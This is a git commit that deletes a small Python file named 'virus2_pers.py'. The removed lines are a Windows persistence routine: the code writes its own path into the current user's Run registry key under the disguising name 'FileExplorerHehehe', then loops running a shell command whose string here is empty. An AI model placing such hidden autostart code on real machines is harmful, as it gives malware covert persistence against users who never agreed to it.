b37f6fbd3642fdff890a8785abb7e336651c4ffc
JappleHacker123 <102459514+jayhyonhan@users.noreply.github.com>
2024-05-04 21:53:16 +0100

    Delete virus2_pers.py

--- virus2_pers.py
+++
@@ -1,8 +0,0 @@
-import winreg as wrg
-import sys, time, os
-a = wrg.OpenKeyEx(wrg.HKEY_CURRENT_USER, r"Software\\Microsoft\\Windows\\CurrentVersion\\Run\\", 0, wrg.KEY_ALL_ACCESS)
-b = wrg.SetValueEx(a, "FileExplorerHehehe", 0, wrg.REG_SZ, sys.argv[0])
-while True:
-    cmd = """"""
-    os.system(cmd)
-    time.sleep(5)
